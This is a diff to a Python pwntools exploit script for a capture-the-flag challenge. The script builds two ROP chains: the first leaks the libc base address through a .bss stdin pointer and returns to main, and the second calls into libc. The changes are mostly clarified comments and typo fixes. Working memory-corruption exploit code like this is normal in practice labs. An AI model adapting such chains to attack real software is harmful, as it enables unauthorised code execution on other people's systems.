@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-# Challenge labels: rop2libc, String handling
+# Challenge labels: rop2libc (there is no stack canary), String handling
 
 from pwn import *
 
@@ -48,23 +48,26 @@ def send_payload_past_input_buffer(data, r):
     r.sendlineafter(b'choice :', b'3')
     r.recvuntil(b'Oh ! You win !!')
 
+
 def main():
     r = conn()
 
     # ROP CHAIN 1 (Leaking the libc base addr)
     # First, we need to set *(uint32_t*)(buffer+0x30) to a value such that (0x7fffffff - *(uint32_t*)(buffer + 0x30)) <= 0
     # This works because we would have 0x7fffffff - 0x808080XX, where XX is the new length placed into 
-    # *(char*)(buffer+0x30) after power_up runs
+    # *(char*)(buffer+0x30) after power_up() runs
     payload1 = b'\x80\x80\x80'
 
     # Call beat(arb_num, exe.bss.stdin) so as to leak the .bss pointer to libc stdin() as an int32_t. We cannot leak GOT because
     # beat() will edit wherever arg2 points to, and the binary has Full RELRO, so this would cause a segmentation fault
+    # It is ok to edit the exe.bss.stdin pointer because the binary does not use it, but rather calls read() and it maintains
+    # its own pointers to the stdin FILE struct
     # Also, setup the retaddr to call main() afterwards so as to reopen the attack vector
     payload1 += p32(0x41414141) # Saved ebp - (set to arbitrary number)
     payload1 += p32(exe.sym.beat) # We will use beat() to leak exe.bss.stdin since it leaks arg2[0] as an int32_t
     payload1 += p32(exe.sym.main) # Set the subsequent retaddr to main() so that the attack vector is reopened after the leak
     payload1 += p32(exe.got.read) # arg1 (arbitrary number, but must be dereferencable and the address can have no null bytes)
-    payload1 += p32(0x804b020) # arg2 (where arg2[0] will be dereferenced, leaked and then edited)
+    payload1 += p32(0x804b020) # arg2 (arg2[0], which is exe.bss.stdin, will be dereferenced, leaked and then edited)
     log.info(f"{payload1=}")
 
     send_payload_past_input_buffer(payload1, r)
@@ -72,7 +75,7 @@ def main():
 
     # Process the libc leak
     r.recvuntil(b'+ HP : ')
-    libc.address = (int(r.recvline().decode().strip()) & 0xFFFFFFFF) - 0x1b05a0 # The bitmasking gets Python to interpret te int32_t as a uint32_t
+    libc.address = (int(r.recvline().decode().strip()) & 0xFFFFFFFF) - 0x1b05a0 # The bitmasking gets Python to interpret the int32_t as a uint32_t
     log.info(f"{hex(libc.address)=}")
 
 
@@ -86,7 +89,7 @@ def main():
     print(rop.dump())
 
     # Finalize payload2
-    payload2 += b'A'*4 + rop.chain() # Place saved ebp before the ROP chain
+    payload2 += b'A'*4 + rop.chain() # Place saved ebp (arb value) before the ROP chain
     log.info(f"{payload2=}")
 
     send_payload_past_input_buffer(payload2, r)
